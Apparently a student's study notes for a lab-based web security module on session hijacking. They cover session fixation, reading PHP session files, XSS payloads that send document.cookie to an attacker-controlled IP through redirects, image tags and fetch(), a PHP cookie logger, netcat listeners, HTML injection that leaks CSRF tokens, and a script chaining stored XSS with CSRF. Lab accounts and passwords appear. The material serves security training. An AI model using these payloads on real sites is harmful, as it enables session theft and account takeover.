# Introduction to Sessions

A user session is a series of requests from the same client and the server responses during a specific time. Web applications use sessions to track user data, access rights, localization, and status, both before and after login.

HTTP is stateless, meaning each request is independent. Therefore, web apps use cookies, URL parameters, POST data, or other methods to maintain session state.

## Module Targets & Lab Setup

Lab uses virtual hosts (vhosts) like:

`xss.htb.net, csrf.htb.net, oredirect.htb.net, minilab.htb.net`

Map them in /etc/hosts on your attack VM:

`IP=<TARGET_IP>`
`printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts`

Check /etc/hosts to confirm the entries. You can edit manually or via a script.

Always update hosts if you spawn a new target VM.

# Session Fixation

Session Fixation happens when an attacker sets a valid session ID for a victim. If the victim logs in with this session ID, the attacker can hijack their session.

## How it works (3 stages):

- Obtain a valid session ID – Applications often assign valid IDs to anyone browsing or registering.
- Fixate the session ID – If the app accepts session IDs from URL parameters or POST data, the attacker can set it.
- Trick the victim – Send the victim a URL containing the fixed session ID. When they log in, the attacker can hijack the session.

# Obtaining Session Identifiers Without User Interaction

## 1. Traffic Sniffing

Attackers on the same local network can capture unencrypted HTTP traffic to get session identifiers. Encrypted traffic (HTTPS, IPsec) prevents this.

Requirements:

- Attacker on the same local network
- Unencrypted HTTP traffic
- Tools: Wireshark

## 2. Post-Exploitation (Web Server Access)

**PHP:**

Session files stored in session.save_path (from php.ini)

<pre>$ locate php.ini
$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
$ ls /var/lib/php/sessions
$ cat /var/lib/php/sessions/sess_<sessionID> </pre>

**Cookie to hijack:**

cookie name: `PHPSESSID`
cookie value: `<sessionID>`

**Java (Tomcat):**

Session manager stores sessions in `SESSIONS.ser`

**.NET:**

Session data in:

`aspnet_wp.exe` (InProc)

`StateServer` (OutProc)

## SQL Server

**3. Post-Exploitation (Database Access)**

If you have database access (via SQL injection or credentials), check for session tables:

<pre>show databases;
use project;
show tables;
select * from users;
select * from all_sessions;
select * from all_sessions where id=3;</pre>

Extracted session IDs allow logging in as users without credentials.


# Cross-Site Scripting (XSS) for Session Hijacking

XSS allows attackers to run arbitrary JavaScript in a victim’s browser. Here, we focus on stealing session cookies using XSS.

Requirements for cookie theft via XSS:

- Session cookies sent in HTTP requests
- Cookies must be accessible via JavaScript (HTTPOnly should be missing)


**Payloads for testing:**

<pre>"><img src=x onerror=prompt(document.domain)>
"><img src=x onerror=confirm(1)>
"><img src=x onerror=alert(1)></pre>

Save changes

Check “Share” functionality for stored XSS execution

## Cookie-Stealing Script (PHP)

Save as log.php on your server:

<pre><?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?></pre>

Run PHP server:

`php -S <VPN/TUN Adapter IP>:8000`

## Stored XSS Payload for Cookie Theft

Update the Country field with:

`<style>@keyframes x{}</style>`
`<video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>`

Alternative HTTPS-safe payload:

`<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>`

## Simulate Victim

Open New Private Window

Login with victim account:

Email: smallfrog576
Password: guitars

Visit the attacker-controlled profile URL:

`http://xss.htb.net/profile?email=ela.stienen@example.com`

PHP server will capture the victim’s cookie in `cookieLog.txt`

## Netcat Option

Instead of PHP, you can use Netcat:

Payload in Country field:

`<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>`

Start Netcat listener:

`nc -nlvp 8000`

When the victim triggers the payload, Netcat receives the cookie (Base64 encoded)

**Decode with JavaScript:**

`atob("<base64_string>")`

## Stealthier Option

Use `fetch()` to send cookies without redirecting the victim:

`<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>`

Sends cookie to your server silently


# Cross-Site Request Forgery (CSRF/XSRF)

CSRF forces a logged-in user to perform unwanted actions on a web application without their knowledge. Attackers leverage a victim’s authenticated session to execute requests.

Vulnerable applications:

- All request parameters can be guessed or determined
- Session management relies solely on cookies

Requirements to exploit CSRF:

- Craft a malicious page that issues a valid request as the victim
- Victim must be logged in when the request is issued

## Lab Setup

Spawn the target system and configure vhost xss.htb.net.

Login to attacker account:

Email: crazygorilla983
Password: pisces

Run Burp Suite and activate the proxy (Intercept On). Configure your browser to go through it.

Click “Save” on your profile to inspect the request. You should see a POST request to /api/update-profile with parameters email, telephone, country and no anti-CSRF token.

## CSRF Attack Example

We can change a user’s profile by having them visit a malicious HTML page.

Malicious page (notmalicious.html):

<img width="956" height="421" alt="image" src="https://github.com/user-attachments/assets/afdbb4e7-372a-4ddb-bcea-826f8ec1558a" />

Serve the page on your machine:

`python -m http.server 1337`

## Simulate Victim

While logged in as Ela Stienen:

Email: ela.stienen@example.com

Visit the malicious page:

`http://<VPN/TUN Adapter IP>:1337/notmalicious.html`

Ela Stienen’s profile fields (email, telephone, country) will change to the values in the HTML page

Confirms the application lacks CSRF protection

# Cross-Site Request Forgery (POST-based)

Most applications perform actions via POST requests, so CSRF tokens are included in POST data. We can exploit HTML Injection/XSS to leak these tokens and mount a CSRF attack.

## Lab Setup

Spawn the target system and configure vhost csrf.htb.net.

Login to victim account:

Email: heavycat106
Password: rocknrol

After login, you can delete the account. Click “Delete” to get redirected to:

`/app/delete/<your-email>`

Notice that the email is reflected on the page. We can inject HTML to leak the CSRF token.

## HTML Injection Example

Inject this into the email value:

`<h1>h1<u>underline<%2fu><%2fh1>`
  
The page shows h1underline

Inspecting the page source reveals our injection and the hidden CSRF input

## Capture CSRF Token via Netcat

Start Netcat to listen on port 8000:

`nc -nlvp 8000`

Send this payload to the victim:

`<table%20background='//<VPN/TUN Adapter IP>:8000/'`

While logged in as Julie Rogers, visit:

`http://csrf.htb.net/app/delete/%3Ctable background='//<VPN/TUN Adapter IP>:8000%2f`

- The CSRF token is leaked via the connection to your Netcat listener
- Works remotely; attacker does not need to be on the same network
- This method allows you to obtain POST-based CSRF tokens via HTML Injection, enabling attacks against victim accounts.


# XSS & CSRF Chaining

Sometimes same-origin/same-site protections block cross-site requests. We can bypass them by chaining XSS and CSRF. The idea is to execute CSRF actions from the victim’s domain using a stored XSS vulnerability.

## Lab Setup

Spawn the target system and configure vhost minilab.htb.net.

Login to attacker account:

Email: crazygorilla983
Password: pisces

**Facts about the application:**

- Country field is vulnerable to stored XSS
- Same-origin/same-site protections prevent normal CSRF
- Stored XSS can bypass these protections

We will leverage the stored XSS in the Country field to issue a state-changing request.

## Intercept Target Request

1.Run Burp Suite and enable proxy
2.Browse Ela Stienen’s profile → click Change Visibility → Make Public

Intercept the POST request in Burp Suite; it includes:

`URL: /app/change-visibility`

- Method: POST
- Parameters: csrf token, action=change

Forward the request to make the profile public.

## XSS Payload for CSRF

Place the following payload in Country field of Ela Stienen’s profile:

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>


## Payload Breakdown

Create GET request to fetch CSRF token

var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();

Handle GET response to extract CSRF token

var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];

Send POST request with CSRF token to change visibility

var changeReq = new XMLHttpRequest();
changeReq.open('post', '/app/change-visibility', true);
changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
changeReq.send('csrf='+token+'&action=change');
csrf: extracted token

action=change: parameter required for request

## Test the Attack

Submit payload in Country field → click Save

Open New Private Window, log in as victim:

Email: goldenpeacock467
Password: topcat

Visit attacker’s profile:

http://minilab.htb.net/profile?email=ela.stienen@example.com

Reload victim’s profile page → visibility changed to public

You just executed a CSRF attack via XSS, bypassing same-origin protections!
